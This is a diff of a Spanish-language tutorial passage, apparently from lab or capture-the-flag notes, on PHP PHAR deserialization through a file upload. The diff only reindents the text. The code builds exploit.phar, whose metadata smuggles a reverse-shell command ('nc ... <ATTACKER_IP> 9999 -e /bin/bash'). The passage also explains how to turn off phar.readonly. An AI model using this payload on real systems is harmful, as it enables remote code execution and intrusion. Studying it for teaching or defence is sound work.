@@ -17,27 +17,27 @@
 A modo de ejemplo, supongamos que encontramos un file upload, podríamos generar un phar con el siguiente procedimiento:
 1) Creamos un archivo .php con el siguiente código:
 
-    <?php
-    include('UserSettings.php');
-    
-    $phar = new Phar("exploit.phar");
-    
-    $phar->startBuffering();
-    
-    $phar->addFromString('0', '');
-    $phar->setStub("<?php __HALT_COMPILER(); ?>");
-    $phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));
-    
-    $phar->stopBuffering();
+        <?php
+        include('UserSettings.php');
+        
+        $phar = new Phar("exploit.phar");
+        
+        $phar->startBuffering();
+        
+        $phar->addFromString('0', '');
+        $phar->setStub("<?php __HALT_COMPILER(); ?>");
+        $phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));
+        
+        $phar->stopBuffering();
 
 
   2) Lo ejecutamos y este nos va a crear el archivo exploit.phar
 #####  Si tenemos el siguiente error:
     PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "exploit.phar" disabled by the php.ini setting phar.readonly in XXXXX
-Stack trace:
-#0 XXXXX: Phar->__construct()
-#1 {main}
-  thrown in XXXXX on line XX
+    Stack trace:
+    #0 XXXXX: Phar->__construct()
+    #1 {main}
+      thrown in XXXXX on line XX
 
 ##### Podemos solucionarlo cambiando la propiedad phar.readonly = On a Off dentro del archivo:
     /etc/php/<php version>/cli/php.ini
